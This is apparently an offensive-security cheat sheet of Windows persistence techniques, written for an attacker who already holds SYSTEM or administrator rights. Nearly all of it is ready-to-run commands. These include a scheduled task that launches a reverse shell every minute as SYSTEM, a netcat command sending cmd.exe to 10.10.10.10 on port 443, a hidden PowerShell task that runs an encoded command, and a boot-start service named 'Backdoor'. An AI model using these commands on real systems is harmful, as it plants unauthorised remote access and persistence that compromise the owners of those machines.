# Scheduled Tasks

## Permissions: SYSTEM | Administrator

### 1) Schtasks

##### Reverse Shell

    schtasks /create /sc minute /mo 1 /tn "Persistence" /tr C:\ReverseShell.exe /ru "SYSTEM"

##### Netcat

    schtasks /create /sc minute /mo 1 /tn "Persistence" /tr 'c:\Users\User\Downloads/nc.exe 10.10.10.10 443 -e cmd.exe'

### 2) Powershell

    function PersistentTask {

	    $TaskName = "Persistence"
	    $Trigger = New-ScheduledTaskTrigger `
	    -Daily `
	    -At 09:00
	
	    $Action = New-ScheduledTaskAction `
	    -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
	    -Argument "-Sta -Nop -Window Hidden -EncodedCommand <EncodedCommand>" `
	    -WorkingDirectory "C:\Windows\System32"

	    Register-ScheduledTask `
	    -TaskName $TaskName `
	    -Trigger $Trigger `
	    -Action $Action `
	    -Force

    }

    PersistentTask

### 3) Services

PowerShell can be leveraged to create a new Service that, on boot will execute a defined binary / script.

    New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<PATH_TO_BINARY>" -Description "<SERVICE_DESCRIPTION>" -StartupType "Boot" 
    New-Service -Name "Backdoor" -BinaryPathName "C:\Users\Administrator\AppData\Roaming\backdoor.exe" -StartupType "Boot"
